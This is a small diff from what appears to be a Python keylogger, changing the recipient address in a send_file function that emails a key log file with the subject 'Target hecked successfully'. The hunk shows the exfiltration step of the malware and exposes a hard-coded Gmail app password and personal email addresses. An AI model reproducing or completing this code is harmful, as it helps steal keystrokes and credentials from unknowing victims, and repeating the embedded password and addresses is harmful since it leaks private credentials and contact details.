@@ -42,7 +42,7 @@ def send_file(path):
     # check out https://support.google.com/accounts/answer/185833?visit_id=638292779507737271-2677340316&p=InvalidSecondFactor&rd=1
     sender_password = 'gwgcbqjtiwjkllep'     
 
-    receiver_email = 'aozaoz2017@gmail.com'  # recipient's email address
+    receiver_email = 'yousif.infinix@gmail.com'  # recipient's email address
     subject = 'Target hecked successfully'
     message = "I'm a genius hecker."
     attachment_path = path     # path to key log file
